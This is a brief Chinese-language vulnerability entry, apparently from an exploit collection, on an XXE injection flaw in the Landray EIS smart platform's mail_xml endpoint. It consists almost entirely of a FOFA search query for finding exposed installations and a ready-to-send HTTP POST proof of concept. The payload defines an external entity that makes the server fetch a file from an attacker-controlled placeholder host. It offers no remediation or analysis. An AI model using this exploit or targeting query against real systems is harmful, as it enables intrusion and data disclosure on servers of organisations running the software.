## 蓝凌EIS智慧和谐平台mail_xml存在XXE注入

## 一、漏洞简介
蓝凌EIS智慧和谐平台mail_xml存在XXE注入

## fofa
```
body="/Scripts/jquery.landray.dialog.js"
```

## POC
```
POST /mail/mail_server.aspx/mail_xml?type=add HTTP/1.1
Host: 
User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/Xml
Content-Length: 93

<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://IP/test.xml"> %remote;]>
```
